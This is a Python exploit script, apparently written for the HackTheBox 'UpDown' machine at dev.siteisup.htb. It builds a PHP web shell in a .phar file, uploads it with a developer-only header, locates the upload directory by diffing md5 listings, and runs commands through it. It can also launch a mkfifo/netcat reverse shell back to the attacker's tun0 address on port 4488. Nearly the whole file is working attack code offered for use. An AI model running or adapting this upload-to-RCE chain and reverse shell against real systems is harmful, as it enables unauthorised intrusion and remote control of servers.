#!/usr/bin/env python3
# by 0xPThree - exploit.se
#
# Usage example:
# python3 updown_rce.py -r
# python3 updown_rce.py -c "ls -al"

from colorama import Fore, Style
import requests, argparse, time, re, random
import netifaces as ni

def createPayload(command):
    file_name = ''.join(random.choices("abcdef0123456789", k=12)) + ".phar"
    with open(file_name, 'w') as f:
        f.writelines([
f'''<?php
    $cmd = '{command}';

    $desc = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
    $pipes = array();

    $process = proc_open($cmd, $desc, $pipes);
    fclose($pipes[0]);
    $string = array(stream_get_contents($pipes[1]), stream_get_contents($pipes[2]));
    proc_close($process);

    print_r($string[0]);
?>

https://exploit.se'''
            ])
    return(file_name)


def uploadFile(url, file):
    # Declare variables
    headers = {'Special-Dev': 'only4dev'}
    files = {'file': open(file, 'rb')}
    data = {'check': 'check'}

    # Send GET to extract all md5 values
    cache_content = requests.get(url + 'uploads/', headers=headers)
    md5_pre = re.findall("[a-f0-9]{32}", cache_content.text)

    # Send POST to upload file
    try:
        requests.post(url, headers=headers, files=files, data=data, timeout=0.05)
    except requests.exceptions.ReadTimeout: 
        pass
    
    # Send GET to compare md5 value against first to extract unique path name
    cache_content = requests.get(url + 'uploads/', headers=headers)
    md5_post = re.findall("[a-f0-9]{32}", cache_content.text)
    md5_dir_list = list(set(md5_post) - set(md5_pre))
    md5_dir = md5_dir_list[0]
    
    full_url = url + 'uploads/' + md5_dir + '/' + file
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} File uploaded to: {full_url}")
    return(full_url)


def getIP():
    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    return(ip)


def execute(url, command, ip=None):
    if command == f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 4488 >/tmp/f":
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Preparing reverse shell")
        print (f"{Fore.GREEN}[+]{Style.RESET_ALL} Starting listener on port 4488")
        from subprocess import Popen
        Popen("nc -lvnp 4488",shell=True)
        requests.get(url, headers={'Special-Dev': 'only4dev'})
    elif ip == None:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Executing command '{command}'...")
        output = requests.get(url, headers={'Special-Dev': 'only4dev'})
        if output.status_code == 200:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Response: {output.text}")
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Response code: {output.status_code} \n{Fore.RED}[-]{Style.RESET_ALL} Data: {output.text}")


def asciiArt():
    print(Fore.CYAN + '''
  _   _       ____                      
 | | | |_ __ |  _ \  _____      ___ __  
 | | | | '_ \| | | |/ _ \ \ /\ / / '_ \ 
 | |_| | |_) | |_| | (_) \ V  V /| | | |
  \___/| .__/|____/ \___/ \_/\_/ |_| |_|
       |_|     by 0xPThree - exploit.se 
       \n''')

def main():
    start = time.time()
    formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=70)
    parser = argparse.ArgumentParser(formatter_class=formatter)
    parser.add_argument('-c','--command', type=str, help='command to execute')
    parser.add_argument('-r','--reverse', action='store_true', help='create reverse shell')
    args = parser.parse_args()

    base_url = 'http://dev.siteisup.htb/'

    asciiArt()

    if args.reverse:
        ip = getIP()
        shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 4488 >/tmp/f"
        file_name = createPayload(shell)
        rce_url = uploadFile(base_url, file_name)
        execute(rce_url, shell, ip)
    else:
        file_name = createPayload(args.command)
        rce_url = uploadFile(base_url, file_name)
        execute(rce_url, args.command)
        
        end = time.time()
        print(f"\ntime elapsed: {end - start} seconds")

    
if __name__ == "__main__":
    main()